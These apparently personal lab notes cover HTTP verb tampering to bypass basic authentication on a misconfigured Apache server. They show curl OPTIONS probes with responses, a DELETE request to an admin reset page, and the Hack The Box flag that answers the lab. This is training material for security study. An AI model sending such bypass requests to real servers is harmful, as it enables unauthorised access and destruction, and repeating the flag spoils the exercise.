# Bypassing Basic Authentication : Insecure server configurations

Automated vulnerability scanning tools usually identify HTTP Verb Tampering vulnerabilities caused by insecure server configurations.

But they miss ones caused by Insecur coding.

Insecure server configurations : easy to identify after by-pass
Insecure coding : harder, it requires active scans

## Identify

- Burp Suite
- Change Requet Method (switch GET to POST)

HEAD requests :
curl -i -X OPTIONS http://SERVER_IP:PORT/

HTTP/1.1 200 OK
Date: 
Server: Apache/2.4.41 (Ubuntu)
Allow: POST,OPTIONS,HEAD,GET
Content-Length: 0
Content-Type: httpd/unix-directory

- Change POST to HEAD in Burp Suite

HEAD -> does not return the body, only headers but it confirmes that the request is bypassing basic auth

## LAB

curl -i -X OPTIONS http://94.237.55.163:53632

curl -i -X OPTIONS http://94.237.55.163:53632/admin/reset.php?
HTTP/1.1 200 OK
Date: Fri, 05 Jan 2024 19:43:46 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8

DELETE /admin/reset.php? HTTP/1.1

HTB{4lw4y5_c0v3r_4ll_v3rb5}
